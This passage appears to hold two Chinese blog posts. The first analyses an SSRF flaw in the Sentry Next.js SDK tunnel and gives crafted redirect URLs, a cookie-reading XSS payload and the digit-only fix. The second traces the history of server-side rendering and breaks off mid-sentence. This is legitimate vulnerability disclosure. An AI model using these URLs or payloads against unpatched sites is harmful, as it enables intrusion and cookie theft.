SSRF via Next.js SDK tunnel endpoint 可以看到這一段： An unsanitized input of Next.js SDK tunnel endpoint allows sending HTTP requests to arbitrary URLs and reflecting the response back to the user. 在 Sentry 裡面，有一個叫做 tunnel 的功能，這張來自於官方文件的圖完美地解釋了為什麼需要 tunnel： 如果沒有 tunnel 的話，送給 Sentry 的請求會在前端直接透過瀏覽器發送，而這些直接發給 Sentry 的請求可能會被一些 ad blocker 擋住，Sentry 就沒辦法接收到數據。若是有開啟 tunnel，就會變成先將請求發送給自己的 server，再從自己的 server 轉發給 Sentry，這樣就變成了 same-origin 的請求，便不會被 ad blocker 擋住。 在專門提供給 Next.js 使用的 Sentry SDK 中，是用了一個叫做 rewrite 的功能，官方範例如下： module.exports = &#123; async rewrites() &#123; return [ &#123; source: '/blog', destination: 'https://example.com/blog', &#125;, &#123; source: '/blog/:slug', destination: 'https://example.com/blog/:slug', // Matched parameters can be used in the destination &#125;, ] &#125;, &#125; Next.js 的 rewrite 基本上可以分為兩種，internal 跟 external，後者的話其實更像是 proxy 的感覺，可以直接把請求導向到外部網站，然後顯示出 response。 Next.js Sentry SDK 的實作在 sentry-javascript&#x2F;packages&#x2F;nextjs&#x2F;src&#x2F;config&#x2F;withSentryConfig.ts： /** * Injects rewrite rules into the Next.js config provided by the user to tunnel * requests from the `tunnelPath` to Sentry. * * See https://nextjs.org/docs/api-reference/next.config.js/rewrites. */ function setUpTunnelRewriteRules(userNextConfig: NextConfigObject, tunnelPath: string): void &#123; const originalRewrites = userNextConfig.rewrites; // This function doesn't take any arguments at the time of writing but we future-proof // here in case Next.js ever decides to pass some userNextConfig.rewrites = async (...args: unknown[]) => &#123; const injectedRewrite = &#123; // Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&amp;p=[projectid]` // Nextjs will automatically convert `source` into a regex for us source: `$&#123;tunnelPath&#125;(/?)`, has: [ &#123; type: 'query', key: 'o', // short for orgId - we keep it short so matching is harder for ad-blockers value: '(?&lt;orgid>.*)', &#125;, &#123; type: 'query', key: 'p', // short for projectId - we keep it short so matching is harder for ad-blockers value: '(?&lt;projectid>.*)', &#125;, ], destination: 'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0', &#125;; if (typeof originalRewrites !== 'function') &#123; return [injectedRewrite]; &#125; // @ts-expect-error Expected 0 arguments but got 1 - this is from the future-proofing mentioned above, so we don't care about it const originalRewritesResult = await originalRewrites(...args); if (Array.isArray(originalRewritesResult)) &#123; return [injectedRewrite, ...originalRewritesResult]; &#125; else &#123; return &#123; ...originalRewritesResult, beforeFiles: [injectedRewrite, ...(originalRewritesResult.beforeFiles || [])], &#125;; &#125; &#125;; &#125; 其中的重中之重就是這一段： const injectedRewrite = &#123; // Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&amp;p=[projectid]` // Nextjs will automatically convert `source` into a regex for us source: `$&#123;tunnelPath&#125;(/?)`, has: [ &#123; type: 'query', key: 'o', // short for orgId - we keep it short so matching is harder for ad-blockers value: '(?&lt;orgid>.*)', &#125;, &#123; type: 'query', key: 'p', // short for projectId - we keep it short so matching is harder for ad-blockers value: '(?&lt;projectid>.*)', &#125;, ], destination: 'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0', &#125;; 會根據 query string 中的 o 跟 p，決定最後要重新導向的 URL。 而這邊的問題是這兩個參數的 regexp 都用了 .*，也就是說會配對到任何字元，換句話說，底下這個網址： https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;abc&amp;p&#x3D;def 會 proxy 到： https:&#x2F;&#x2F;oabc.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0 看起來沒什麼問題，但如果是這樣呢？ https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;example.com%23&amp;p&#x3D;def %23 是 # URL encode 後的結果，最後就會 proxy 到： https:&#x2F;&#x2F;oexample.com#.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0 我們利用了 # 來把原本的 hostname 都當成 hash 的一部分，並且成功更改了 proxy 的目的地。但最前面那個 o 還是有點煩人，不如把它一起消除掉吧！只要在最前面加個 @ 就行了： https:&#x2F;&#x2F;huli.tw&#x2F;tunnel?o&#x3D;@example.com%23&amp;p&#x3D;def 會變成： https:&#x2F;&#x2F;o@example.com#.ingest.sentry.io&#x2F;api&#x2F;def&#x2F;envelope&#x2F;?hsts&#x3D;0 如此一來，攻擊者就可以利用 o 這個參數更改 proxy 的目的地，將 request 導向至任何地方。剛剛有說過這個 rewrite 功能會將 response 直接回傳，所以當使用者瀏覽：https://huli.tw/tunnel?o=@example.com%23&amp;p=def 的時候，看到的 response 會是 example.com 的結果。 也就是說，如果攻擊者把請求導向至自己的網站，就可以輸出 &lt;script&gt;alert(document.cookie)&lt;/script&gt;，就變成了一個 XSS 漏洞。 若是攻擊者不是導到自己的網站，而是導向到其他內部的網頁如 https://localhost:3001 之類的，就是一個 SSRF 的漏洞（但目標必須支援 HTTPS 就是了）。 至於修復方式的話也很簡單，只要對 regexp 做出一些限制即可，最後 Sentry 是調整成只允許數字： &#123; type: 'query', key: 'o', // short for orgId - we keep it short so matching is harder for ad-blockers value: '(?&lt;orgid>\\\\d*)', &#125;, 7.77.0 版本以及之後的版本都已經修復了這個問題。 總結這個漏洞真的滿簡單而且滿好重現的，只需要找到修復的 commit，看兩眼程式碼大概就能知道怎麼攻擊。 總之呢，在做 URL rewrite 的時候真的必須謹慎一點，不然還滿容易出問題的（尤其是你不只是 rewrite path，而是 rewrite 整個 URL）。","link":"/2023/11/13/sentry-nextjs-sdk-cve-2023-46729/"},{"title":"從歷史的角度探討多種 SSR（Server-side rendering）","text":"你知道嗎，當你跟朋友在討論 SSR 的時候，很有可能你們對 SSR 的認知其實是不一樣的。直接舉個例子，底下這幾種情境，你覺得哪些算是 SSR？ 由後端 PHP 產生畫面 前端是 React 寫成的 SPA，但後端如果偵測到搜尋引擎，就會切換另一種 template，輸出專門針對搜尋引擎的模板，而非 React 渲染出的頁面 前端是 React 寫成的 SPA，但透過 Prerender 先把頁面 render 成 HTML，再交給搜尋引擎（一般使用者依然是 SPA），跟上一個的差別是使用者跟搜尋引擎看到的畫面基本上一致 前端是 React 寫成的 SPA，在後端用 renderToString 把 React 渲染成字串，但是沒有資料，資料會在前端拿 前端是 React 寫成的 SPA，後端會針對每個 page 先呼叫 API 拿資料，拿完以後才呼叫 renderToString 輸出 HTML，在 client 端時會做 hydration 讓頁面可以互動 有一種人認為只要是由後端產生出畫面，就叫做 SSR，所以 1 ~ 5 全部都是 SSR。也有一種人認為前端必須先是 SPA，此時搭配的後端才能叫做 SSR，所以 2~5 都是 SSR；而另一種人則認為 SSR 的重點是 hydration，所以只有 5（或是 45）是 SSR。 下圖是我自己在推特簡單調查的結果，可以看見意見確實是有分歧的： 為什麼會有這篇文章？五年前的時候我就有寫過一篇文章在講 SPA 與 SSR：跟著小明一起搞懂技術名詞：MVC、SPA 與 SSR，那時候的我跟現在的我想法是一致的。 「現在的我」指的是還沒完全整理好想法，正在寫這段前言，底下都還沒寫好的我，等寫完以後會在結尾處再講「之後的我」的想法。但總之呢，現在的我的想法是，「並不是所有從 Server 產生出畫面的方式都『適合』稱作 SSR」。 先來看一個假想情境： A：欸，你們公司網頁是用什麼方式 render 啊？B：就 SSR 啊A：是喔，那你們是用什麼框架處理 SSR？B：就普通 PHP 而已，沒有用框架，前端就 jQuery 再看一個： A：最近在解 SSR 的問題搞到好煩，資料好難弄B：還好吧，我們用 PHP 都用得滿順利的啊 雖然說 server-side rendering 這個詞從字面上來看，就是指由 server 進行渲染，所以要說 PHP 是 SSR 從字面上看沒什麼問題，但我認為重點是「為什麼需要 SSR 這個詞」？ 我的理解是在 SPA 還不流行的年代，根本沒什麼東西是 CSR（Client-side rendering），所以根本也不需要 SSR 這個詞。那時你只會說：「我們公司用 PHP」，而不是說：「我們公司用 PHP 做 SSR」。 有點像是我問我朋友他買的便當多少錢時，他會回我：「100 塊」，而不是「100 塊新台幣」，因為我們都預設了幣值是新台幣，所以不用特別多此一舉。同理，那時候只有從 server render 這條路，所以根本不需要特別提什麼 SSR。 但是後來 SPA 盛行，許多東西開始變成 CSR，此時就會碰到只有 CSR 才會碰到的問題如 SEO 等等，這時候為了解決這些問題，勢必有些東西要讓 server 去處理，在這種狀況下，Server-side rendering 這個詞才產生了新的意義，變成了「為了解決 CSR 的問題，產生的 server 端解決方案」 因此，將 PHP 稱之為 SSR 沒也不行，但卻是沒有意義的。 就像是如果我們把「飲料」定義為「可以喝的液體」，那你能不能說酸辣湯也是一種飲料？照定義來看沒有問題，但當有人問你「最喜歡喝的飲料是什麼？」的時候，你會說酸辣湯嗎？應該不會，而我們也不會把酸辣湯稱之為是飲料。 同理，雖然 SSR 字面上的意思是那樣，PHP 這種傳統 server 輸出內容的方案也可以稱之為 SSR，但你不會這樣叫它。SSR 更適合拿來指涉的是「用來解決 SPA 問題的 server 端解決方案」。 寫到這裡我就開始好奇了，那是不是在 SPA 與 CSR 流行以前，SSR 這個詞真的很少被使用？如果是的話，那到底從什麼時候開始的？還有，我對 SSR 的認識基本上是從 React 開始，那難道更早的框架如 Angular、Ember 或甚至是 backbone 等等，都沒有這問題嗎？如果有的話，他們的解決方案又稱之為什麼？ 於是我開始了一段要花費很多時間，討論的問題或許也沒這麼重要，但我自己很樂在其中的探索之路。 SPA 是從什麼時候開始流行的？前面有提過我的主張是：「SSR 一詞在 SPA 盛行後開始跟著流行起來，專門指涉處理 CSR 與 SPA 問題的 server 端解決方案」 而我認為 SPA 的發展與整個網頁前端的發展其實滿有關聯的，因此先帶大家回顧一下歷史吧！ 1995 年 JavaScript 正式推出，而當時雖然 JavaScript 的功能沒有這麼成熟，但已經有其他的技術可以在網頁上跑一個應用程式起來，就是 Java Applet。 而 Flash 在 1996 年發布，早期 JavaScript 還沒這麼強大時，要做比較完整的網頁應用程式，應該都是透過 Java Applet 或是 Flash。 那要到什麼時候，JavaScript 才成熟到真的可以獨當一面，用它來寫一個網頁應用程式呢？這個答案會跟技術的發展有關，作為一個需要跟後端溝通的網頁應用程式，最需要的是什麼？ 是一個現在已經跟空氣和水一樣存在的東西：XMLHttpRequest。 想要不換頁就能獨立運作並且與 server 溝通，XMLHttpRequest 是必要條件，必須先有 XMLHttpRequest 這個 API，才能不換頁就能與 server 交換資料。 不過在最剛開始的時候，並不是所有的瀏覽器都用 XMLHttpRequest，最早有這個概念的微軟用的是 ActiveXObject，從 2006 年第一版的 jQuery 原始碼就能驗證這件事： // If IE is used, create a wrapper for the XMLHttpRequest object if ( jQuery.browser.msie &amp;&amp; typeof XMLHttpRequest == \"undefined\" ) XMLHttpRequest = function()&#123; return new ActiveXObject( navigator.userAgent.indexOf(\"MSIE 5\") >= 0 ? \"Microsoft.XMLHTTP\" : \"Msxml2.XMLHTTP\" ); &#125;; 講到了 XMLHttpRequest 之後，理所當然就會提到 Ajax，這個詞來自於 2005 年 2 月 18 日 Jesse James Garrett 發表的這篇文章：Ajax: A New Approach to Web Applications，裡面描述了一種使用 HTML + CSS + DOM + XMLHttpRequest 的新型溝通模式，我認為就是 SPA 的雛型了 （圖片來自於上面提到的文章） 另外，在文章裡也有提到 XMLHttpRequest 與 Ajax 的不同之處： Q. Is Ajax just another name for XMLHttpRequest?A. No. XMLHttpRequest is only part of the Ajax equation. XMLHttpRequest is the technical component that makes the asynchronous server communication possible; Ajax is our name for the overall approach described in the article, which relies not only on XMLHttpRequest, but on CSS, DOM, and other technologies. 從歷史的資料看起來，微軟的 Outlook 似乎是最早提起並運用這些技術的產品，從 2000 年就開始了，但論起大量運用並讓這個名詞廣為人知的話，就屬 2004 ~ 2005 年左右的 Google 了。 而差不多在這個時期，JavaScript 的生態系也迎來了蓬勃的發展，出現了一堆 library 如 Prototype、Dojo Toolkit 以及 MooTools 等等，還有 2006 年誕生的 YUI（Yahoo! User Interface Library）以及至今靈壓依然存在的 jQuery，都讓網頁前端得到了更進一步的發展，2007 年也出現了 Ext JS 這種專門拿來寫網頁應用的框架。 雖然說這些函式庫們都讓寫網頁變得更加容易，但 SPA 在這個時候還沒有流行起來，而是要等到兩位大前輩的誕生。 2010 年 10 月 13 日，Backbone.js 釋出了第一個版本，而一週後的 10 月 20 日，則是 AngularJS 首次發佈的日子。 而過了一年之後，別的 SPA 前端框架也出現了，分別是 2011 年 12 月 8 日發布的 Ember.js，以及 2012 年 1 月 20 出現的 Meteor.js。 一般來說一個新的框架出現以後，大概至少都要過個半年一年左右才會真正流行起來，因此我認為 2011 以及 2012 這兩年是 SPA 興起的開端，但是該用什麼資料來佐證呢？ 關鍵字搜尋趨勢一定程度代表了當時某些技術名詞的流行程度，從下圖可以看出來，SPA 一詞大概是從 2011、2012 年左右開始一路攀升，與我的推測吻合（但這個數據其實不太精確就是了，可我一時想不到更好的了）： （至於 2004、2005 那個高峰是什麼，我不知道，但很想知道的。或許跟一堆 Google 服務的流行有關？有線索的可以私訊或是留言討論） 之後的故事大家就比較熟悉了，2013 年 5 月 React 正式發佈，2014 年 2 月則是 Vue，隨著前端框架的盛行，SPA 也變得越來越流行，到了今天甚至變成了前端開發的主流。 早期的 SPA 如何解決 CSR 的問題？從上面的發展史中可以得知開創 SPA 盛世的元老就屬 Backbone.js 以及 AngularJS 了，那他們是怎麼解決 CSR 的問題，例如說 SEO？ 先來看 AngularJS 好了，我在 GitHub 上找到一個 2013 年的專案：angular-on-server，在 wiki 的前言中寫著： We need to pre-render pages on the server for Google to index. We don’t want to have to repeat ourselves on the back end. I found a few examples of server-side rendering for Backbone applications, but none showing how to do it with AngularJS. To make this work I have modified a couple of Node modules, jsdom and xmlhttprequest. They are loaded from local subdirectories (&#x2F;jsdom-with-xmlhttprequest and &#x2F;xmlhttprequest). 如果他所言為真，就代表當時 AngularJS 的 SSR 解決方案並不多，大多數都是 Backbone.js 的。 從我找到的資料來看，似乎也是如此，像是這篇 2013 年的發問：AngularJS - server-side rendering，從回答中就可以看出解法確實不多。 而 AngularJS 官方正式支援 SSR，是要一直到 2015 年 6 月底的這個演講：Angular 2 Server Rendering，在演講結束後幾天後開源了 Universal Angular 2，也就是現在的 Angular Universal 的前身。 在當時的 README 中，說明寫著： Universal (isomorphic) JavaScript support for Angular 2 看到 isomorphic 這個詞，應該勾起了不少人當年的回憶，但這個我們等等再談，先來看 Backbone.js 又是怎麼解決 SPA 問題的。 我有在 GitHub 上面找到一個 2011 年的古老範例：Backbone-With-Server-Side-Rendering，README 寫著： Backbone.js is a great tool for organizing your javascript code into models, collections and views, without tying your data to the DOM elements. However, most tutorials show how to render the HTML only via Backbone (client-side), which means that none of your content is crawled by search engines. This is possibly a major problem if you’re not making an app hidden behind an authentication system. 比較特別的地方在於這個專案的 SSR 是透過 Ruby on Rails 實作的，但我看了一下原始碼，感覺比較像一個實驗性質的專案，透過後端把HTML 輸出，接著到了前端再由 Backbone.js 接手，是一個簡單的小範例，而非完整的 demo。 如果想要更完整的解決方案，就屬 2013 年由 Airbnb 開源出來的 Rendr 了。 在 2013 年 1 月 30 日，Airbnb 的技術部落格發表了一篇新的文章：Our First Node.js App: Backbone on the Client and Server，裡面講到了 SPA 會有的問題，以及有許多邏輯在前後端都各有一份，想要做整合。而最後的解法就是 Rendr 這個套件，能把 Backbone.js 搬到 server 去執行。 至於 Rendr 的開源則是過了三個月以後的這篇文章宣布的：We’ve open sourced Rendr: Run your Backbone.js apps in the browser and Node.js，裡面寫說： Many developers shared the same pain points with the traditional client-side MVC approach: poor pageload performance, lack of SEO, duplication of application logic, and context switching between languages. 可見當時有大量的開發者也都意識到了 SPA 的問題，並且想要一個比較完善的解決方案。 想要把 Backbone.js 搬到 server 去執行，有個先決條件，那就是 server 要可以執行 JavaScript。 Node.js 是在 2009 年釋出的，而 Express 是在 2010 年底，NPM 則是 2011 年。2012 年中的時候 Node.js 還在 v0.8.0，是很早期的階段。從現在回頭看，Node.js 開始被大量使用，應該就差不多是 2012 ~ 2013 開始的。 總之呢，從我找到的資料來看，或許最早被廣泛運用於 SSR 的 library 就是 2013 推出的 Rendr 了，它能夠做到的事情是「在一開始由 server-side render，但是到了 client-side 以後由 JavaScript 接手」，如同 Airbnb 的文章中寫到的： Your great new product can run on both sides of the wire, serving up real HTML on first pageload, but then kicking off a client-side JavaScript app. In other words, the Holy Grail. 底下這張圖就是所謂的 Holy Grail，取自 Airbnb 當初發表的文章： 寫到這邊，整理一下時間軸以及我個人的猜測。 從 2010 年底 Backbone.js 釋出以後，SPA 開始變得逐漸流行起來，而大家也意識到了畫面在前端渲染會碰到的問題，因此開始各自實作起不同的解決方案，也就是 server-side rendering。 而 Backbone.js 一直到了 2013 年 Airbnb 開源了 Rendr 以後，才終於有了一個最理想的解法，那就是「首次渲染在 server side，而之後的話渲染都在 client side，並且 client 跟 server 是共用同一套程式碼」 「同一行程式碼既可以跑在 client 又可以跑在 server」，這個概念就是前面所提到的 isomorphic。 順帶一提，Ember.js 官方的 SSR 解法應該是要到 2014 年底的這篇：Inside FastBoot: The Road to Server-Side Rendering 再補充一件事情，根據 The History of React.js on a Timeline 這篇文章，FaxJS 是 React 的前身，而在 2011 年底開源的時候就有 server-side rendering 的 API，可以把元件渲染成 static HTML，並且在 client-side 把事件裝回去：https://github.com/jordwalke/FaxJs/tree/5962e3a7268fc4fe0251631ec9d874f0c0f52b66#optional-server-side-rendering Isomorphic JavaScriptIsomorphic JavaScript 一詞來自於 Charlie Robbins 在 2011 年 10 月 18 日發表的文章：Scaling Isomorphic Javascript Code 文章中有提到了 Isomorphic 的定義： Javascript is now an isomorphic language. By isomorphic we mean that any given line of code (with notable exceptions) can execute both on the client and the server. 而更多細節可以在 Airbnb 於 2013 年 11 月 12 日發布的這篇文章中找到：Isomorphic JavaScript: The Future of Web Apps 在文章裡面還有附上了一個實際案例，很值得參考：isomorphic-tutorial。 除此之外，文章裡面有提到在 Rendr 之前還有三個 Isomorphic JavaScript 的先行者，一個是 2012 年 Yahoo! 開源的 Mojito，在文章中提到了一個美好的想像： Imagine a framework where the first page-load was always rendered server-side, and desktop browsers subsequently just made calls to API endpoints returning JSON or XML, and the client only rendered the changed portions of the page. 基本上就是現在主流前端的運作方式。 另一個則是 Meteor.js，第三個是 Asana 的 Luna，這個 Luna 挺有趣的，仔細看之後發現語法有點 React 的味道。 而 Isomorphic 這個詞一直到 2015 年 Michael Jackson 的這篇文章出來以後，才漸漸被「Universal」給取代：Universal JavaScript。 這篇文章主要覺得比起 Isomorphic 這個詞，Universal 更能表達原本想表達的意涵，而且聽眾們會更容易理解，因此提倡用 Universal JavaScript 來替代 Isomorphic JavaScript。 中場總結寫到這裡，我自己回答了我之前的幾個疑問： Q: 那是不是在 SPA 與 CSR 流行以前，SSR 這個詞真的很少被使用？如果是的話，那到底從什麼時候開始的？ 不確定，因為沒有特別找更早以前的資料佐證，但如果是看 SSR 這個詞的搜尋趨勢的話，大概是從 2012~2013 左右開始起飛的，跟 SPA 開始流行的時間點差不多。 Q: 我對 SSR 的認識基本上是從 React 開始，那難道更早的框架如 Angular、Ember 或甚至是 backbone 等等，都沒有這問題嗎？如果有的話，他們的解決方案又稱之為什麼？ 他們有相同的問題，而解法一樣稱之為 SSR。 說實在的，討論 SSR 這個名詞的明確定義確實沒什麼太大意義，反倒有點太鑽牛角尖了，而且也很難有個結論，或是說服別人：「這個定義才是對的」，只要在溝通的時候確保雙方的認知一致即可。 在談到 SSR 的時候，很多人都只關注到 SEO 的問題，但如果再更仔細想一點，其實需要利用 SSR 解決的，可不只有 SEO。 SSR 想解決的問題SSR 想解決的問題，就是 CSR 會造成的問題，包括： SEO 各種社群平台的 link preview Performance 使用者體驗 如果用了 CSR，由於畫面都是透過 JavaScript 所產生，搜尋引擎只會爬到空白的 HTML，就算 Google 會執行 JavaScript，其他搜尋引擎也不一定會。就算所有搜尋引擎都會執行 JavaScript，你也很難保證爬出來的結果是你要的。 舉例來說，你很難掌握它們執行完 JavaScript 以後，到底什麼時候會結束。如果抓取資料的 API 要兩秒以後才會有 response，那假設搜尋引擎執行 JavaScript 以後只等一秒就當作最終結果，那結果還是不會有資料。 社群平台的 link preview 則是另一個問題，那些 &lt;meta&gt; 標籤在 client 產生是沒有用的，通常這些社群平台的 bot 是不會去執行 JavaScript 的，只看 response，所以 CSR 的頁面的 &lt;meta&gt; 永遠只能是同一個，沒辦法根據不同頁面動態決定內容。 第三點跟第四點可以一起看，雖然現在的裝置基本上都跑得很快，能夠快速執行 JavaScript，但不排除在 JavaScript 很大一包而且裝置比較舊的情況之下，執行 JavaScript 還是需要一段時間。 CSR 的網頁要到什麼時候使用者才能看到畫面？要先下載完 JavaScript，下載完還要執行，執行結束更新 DOM 以後，使用者才能看到完整的畫面。在等待的期間，畫面就是一片空白，雖然有些網站會做個 loading，但總之使用者體驗不是很好。 如果能在一開始的 response 就拿到畫面，那使用者體驗就會變好，效能也會增加，就算是很舊的裝置，也能在一開始就看到畫面，不需要等 JavaScript 執行完畢。 各種不同的 SSR其實這篇一開始只想寫這個段落的，殊不知寫著寫著就變成了前端歷史的考古文。 因應剛剛提到的 CSR 會產生的問題，就產生出了多種解法，每一種都不太一樣，而且並不一定能一次解決所有的問題。 第一種：針對搜尋引擎以及 bot 渲染另一個模板這種解法只解了 SEO 跟 link preview 的問題，當 server 端收到的請求來自於搜尋引擎或是社群平台的 bot 時，就直接利用原本後端的 template 輸出結果。 像是這樣： const express = require('express'); const app = express(); app.get('/games/:id', (req, res) => &#123; const userAgent = req.headers['user-agent']; // 檢查 User Agent 是否為 Googlebot if (userAgent.includes('Googlebot')) &#123; // 如果是 Googlebot，輸出 SEO 相關的 HTML 與 meta tags const game = API.getGame(req.params.id); res.send(` &lt;html> &lt;head> &lt;title>$&#123;game.title&#125;&lt;/title> &lt;meta name=\"description\" content=\"$&#123;game.desc&#125;\"> &lt;/head> &lt;body> &lt;h1>$&#123;game.title&#125;&lt;/h1> &lt;p>$&#123;game.desc&#125;&lt;/p> &lt;/body> &lt;/html> `); &#125; else &#123; // 如果不是 Googlebot，回傳 index.html res.sendFile(__dirname + '/public/index.html'); &#125; &#125;); app.listen(3000, () => &#123; console.log('Server is running on port 3000'); &#125;); 對於一般使用者來說，效能跟使用者體驗的問題還是沒有解決，這種解法只解了 SEO 跟 link preview，確保這些 bot 抓到的畫面是 HTML。 我自己有在工作上實作過這種方式，優點就是簡單快速，而且跟 SPA 互不干擾，缺點大概就是 Google bot 看到的頁面會跟使用者看到的不一樣，有可能影響到 SEO 分數，畢竟針對 Google bot 輸出特殊頁面是 anti-pattern，叫做 cloaking。 雖然我們的出發點是好的，但仍然是不被官方建議的行為，可以參考 Google 官方的影片：Can we serve Googlebot a different page with no ads?，裡面就提到了最好是 exact same page。 但比起讓 Google bot 什麼都看不到，這個解法應該還是更好一些。 第二種：同樣是針對搜尋引擎，但是做 pre-render這個解法最知名的框架是 Prerender，簡單來講就是先在 server 端用 puppeteer 之類的 headless browser 去開啟你的頁面並且執行 JavaScript，然後把結果保存成 HTML。 當搜尋引擎來要資料的時候，就輸出這個 HTML，因此使用者跟 bot 看到的畫面是一樣的。 我有在 local 試了一下，用 create-react-app 簡單寫了一個頁面： import logo from './logo.svg'; import './App.css'; import &#123; useState, useEffect &#125; from 'react' function App() &#123; console.log('render') const [data, setData] = useState([]); useEffect(() => &#123; document.querySelector('title').textContent = 'I am new title' fetch('https://cat-fact.herokuapp.com/facts/').then(res => res.json()) .then(a => &#123; setData(a); &#125;) &#125;, []) function test() &#123; alert('click') &#125; return ( &lt;div className=\"App\"> &lt;header className=\"App-header\"> &lt;img src=&#123;logo&#125; className=\"App-logo\" alt=\"logo\" /> &#123;data &amp;&amp; data.map(item => ( &lt;div>&#123;item.text&#125;&lt;/div> ))&#125; &lt;a className=\"App-link\" href=\"https://reactjs.org\" target=\"_blank\" rel=\"noopener noreferrer\" > Learn React Can you see me now? &lt;/a> &lt;button onClick=&#123;test&#125;>hello&lt;/button> &lt;/header> &lt;/div> ); &#125; export default App; 主要想測的有幾點： 頁面是不是依然可以互動 動態修改的 title 是否會反映在結果 是不是會輸出拿到 API response 後的結果 經過 prerender 以後，輸出的 HTML 為： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;link rel=\"icon\" href=\"http://localhost:5555/favicon.ico\"> &lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"> &lt;meta name=\"theme-color\" content=\"#000000\"> &lt;meta name=\"description\" content=\"Web site created using create-react-app\"> &lt;link rel=\"apple-touch-icon\" href=\"http://localhost:5555/logo192.png\"> &lt;link rel=\"manifest\" href=\"http://localhost:5555/manifest.json\"> &lt;title>I am new title&lt;/title> &lt;script defer=\"defer\" src=\"http://localhost:5555/static/js/main.21981749.js\">&lt;/script> &lt;link href=\"http://localhost:5555/static/css/main.f855e6bc.css\" rel=\"stylesheet\"> &lt;/head> &lt;body> &lt;noscript>You need to enable JavaScript to run this app.&lt;/noscript> &lt;div id=\"root\"> &lt;div class=\"App\"> &lt;header class=\"App-header\"> &lt;img src=\"/static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg\" class=\"App-logo\" alt=\"logo\"> &lt;div>When asked if her husband had any hobbies, Mary Todd Lincoln is said to have replied \"cats.\"&lt;/div> &lt;div>Cats make about 100 different sounds. Dogs make only about 10.&lt;/div> &lt;div>Owning a cat can reduce the risk of stroke and heart attack by a third.&lt;/div> &lt;div>Most cats are lactose intolerant, and milk can cause painful stomach cramps and diarrhea. It's best to forego the milk and just give your cat the standard: clean, cool drinking water.&lt;/div> &lt;div>It was illegal to slay cats in ancient Egypt, in large part because they provided the great service of controlling the rat population.&lt;/div> &lt;a class=\"App-link\" href=\"https://reactjs.org\" target=\"_blank\" rel=\"noopener noreferrer\">Learn React Can you see me now?&lt;/a> &lt;button>hello&lt;/button> &lt;/header> &lt;/div> &lt;/div> &lt;/body> &lt;/html> title 有變了，內容也是 useEffect() 的 fetch 執行完並且 render 完的結果，按了按鈕以後也可以觸發事件，看起來沒什麼問題。 如果更仔細看一下，prerender 渲染出來的頁面執行流程跟正常 React app 差不多，唯一的差別在於原本的 HTML 就已經有東西了，但整個 React 還是會執行一次，並且將整個頁面重新渲染。 因此會出現底下狀況： 拿到 server response，是完整並且有資料的頁面 React 啟動，進行初次渲染，此時 data 變成初始化狀態，頁面變成沒資料的狀態 React 將結果 mount 到 DOM，觸發 useEffect，再打一次 API 拿資料 狀態更新，渲染出有資料的頁面 這個解法依然是只針對搜尋引擎，跟第一種的差別在於使用者跟搜尋引擎看到的頁面會更相近，但其實還是不太一樣，畢竟一般使用者看到的還是什麼都沒有的頁面。 那可以把 pre-render 的頁面也拿給一般使用者看嗎？ 是可以，但如果有 API 的話會變得有點奇怪，如上所述，初始狀態 state 是沒有資料的，但是 HTML 有，因此使用者看到的頁面就會是：有資料（因為 pre-render HTML） &#x3D;&gt; 沒資料（state 初始化） &#x3D;&gt; 有資料（在 client 打 API），在體驗上會不太好，所以通常也不會這樣做。 這個解法的優點也是方便，不需要改到原本的 SPA，只需要在 server 那邊加一個 middleware 即可，而缺點的話則是實作起來比第一種複雜，而且有滿多細節要注意的，可以參考：Funliday 重磅推出新的 prerender 套件 pppr 以及 在 ModernWeb 2020 分享的「pppr - 解決 JavaScript 無法被搜尋引擎正確索引的問題」。 第三種：在 server render client app這一種就是前面一直提到的：「在 server 產生第一個畫面的 HTML，而後續的操作都交給 client」，相較於前兩者，這是更理想的 SSR，也是俗稱的 Isomorphic&#x2F;Universal。 因為這種的做法不只解決了 SEO 的問題，也解決了使用者體驗的問題。當使用者造訪網站時，就可以立刻看到渲染完的結果，但此時畫面因為 JavaScript 沒有執行完，可能沒有辦法操作，需要等 JavaScript 執行完畢並且把 event handler 掛上時，才能真的跟頁面互動。 另外，由於初始畫面已經在 server 渲染好了，所以在 client 端通常不需要再修改一次 DOM，只需要把 event handler 掛上去，這個流程稱為 hydration，中文通常翻作「水合」。 我覺得這個詞用得相當有畫面感，就把它想成是 SSR 輸出的頁面是被「脫水」過的，非常扁平乾燥，就只有畫面而已，沒辦法跟它互動。到了 client 以後，就需要把這個乾燥的畫面注入水，加上 event handler，讓整個頁面「活起來」，才能重現生機，變成可互動的頁面。 然而，這種解法的缺點就是實作起來更複雜一點，需要考慮到的問題是 API，例如說如果把 API call 放在 useEffect 裡面，那在 server render 時就不可能執行到，最後渲染出來的頁面就是沒有任何資料的狀態。 因此，可能要幫每個頁面都加上一個 function 去拿取資料，拿完之後放到 props 去，在 server side render 時才能正確輸出有資料的頁面。 也因為這個比較複雜，所以通常都交給框架來做了，像是 Next.js 就是採用我前面講的做法（Pages Router），會在頁面加上一個 getServerSideProps 的 function。 順帶一提，Next.js 的第一版是 2016 年 10 月 25 釋出的。 第四種：在 build time 就做 render這算是針對產品情境特化的 SSR，剛剛講的第三種，是在每一個 request 都會做一次 render，產生出初始畫面。但如果你的頁面對於每一個 user 來說都長一樣（例如說官方網站的公司介紹），那其實根本不用在 run time 做這件事，在 build time 就好了。 於是，有一種做法是在 build time 的時候就會把頁面 render 好，速度會快上許多。 這種方法在 Next.js 裡面被稱之為 Static Site Generation，簡稱為 SSG。 該怎麼命名各種不同的 SSR？整理一下剛剛講的四種： 針對搜尋引擎以及 bot 渲染另一個模板 同樣是針對搜尋引擎，但是做 pre-render 在 server render client app 在 build time 就做 render 不同的文件對於這幾種的稱呼都不同，接著來看幾份文件。 web.dev第一份是 web.dev 的：Rendering on the Web，在文末有一個光譜： 第一種沒特別提到，第二種比較像是「CSR with Prerendering」，但又好像不太像，第三種是：「SSR with (Re)hydration」，第四種是：「Static 